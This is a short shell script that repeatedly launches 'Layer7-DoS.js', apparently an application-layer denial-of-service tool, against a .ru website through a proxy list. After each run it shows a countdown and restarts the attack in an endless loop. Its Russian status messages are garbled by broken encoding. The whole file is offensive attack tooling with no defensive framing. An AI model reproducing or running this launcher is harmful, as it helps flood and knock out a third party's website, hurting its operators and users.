#!/bin/sh
            BINDIR=$(dirname "$(readlink -fn "$0")")
            cd "\$BINDIR"
            while true
            do
                node Layer7-DoS.js https://����.ru/ proxies.txt 999
                echo "����� ���������� ������ ������� Ctrl + C!"
                echo "������������ �����:"
                for i in 5 4 3 2 1
                do
                    echo "$i..."
                    sleep 1
                done
                echo "������������!"
            done